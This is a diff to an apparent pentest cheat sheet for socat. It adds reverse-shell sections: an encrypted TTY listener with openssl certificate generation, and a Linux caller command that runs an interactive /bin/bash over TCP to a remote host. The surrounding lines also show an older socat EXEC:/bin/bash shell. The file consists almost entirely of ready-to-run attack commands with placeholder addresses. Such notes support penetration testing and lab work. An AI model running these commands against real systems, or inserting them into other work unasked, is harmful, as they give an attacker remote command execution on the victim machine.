@@ -26,10 +26,27 @@ encrypted: OPENSSl-LISTEN:<local_port>,cert=<cert>.pem,verify=0,fork
 socat TCP4-LISTEN:<listen_port> STDOUT
 ```
 
+## reverse shell - callee (2)
+file:`tty`,raw,echo=0
+openssl req -newkey rsa:2048 -nodes -keyout <cert>.key -x509 -days 1000 -subject '/CN=jubeaz' -out <cert>.crt
+cat <cert>.key <cert>.crt L > <cert>.pem 
+encrypted: OPENSSl-LISTEN:<local_port>,cert=<cert>.pem,verify=0,fork
+```bash
+socat file:`tty`,raw,echo=0 tcp-listen:<listen_port>
+```
+
+
 ## reverse shell - caller (linux)
 encrypted: OPENSSL:<local_ip><local_port>,verify=0
 ```bash
 socat TCP4:<local_ip><local_port> EXEC:/bin/bash
+```
+
+
+## reverse shell - caller (linux) (2)
+encrypted: OPENSSL:<local_ip><local_port>,verify=0
+```bash
+socat exec:'/bin/bash -li',pty,stderr,setsid,sigint,sane TCP4:<local_ip><local_port>
 ```
 
 ## reverse shell - caller (windows)
